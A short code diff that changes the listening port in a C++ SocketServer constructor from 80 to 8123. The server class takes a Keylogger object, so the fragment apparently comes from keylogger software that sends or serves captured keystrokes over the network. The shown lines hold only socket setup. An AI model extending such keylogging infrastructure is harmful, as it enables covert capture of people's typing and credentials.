@@ -67,7 +67,7 @@ SocketServer::SocketServer(Keylogger* logger) {
 	this->initHostInfo();
 	std::cout << this->ip << " " << this->hostName << std::endl;
 
-	result = getaddrinfo(ip.c_str(), "80", &hints, &addr);
+	result = getaddrinfo(ip.c_str(), "8123", &hints, &addr);
 
 	if (result != 0) {
 		cerr << "getaddrinfo failed: " << result << "\n";
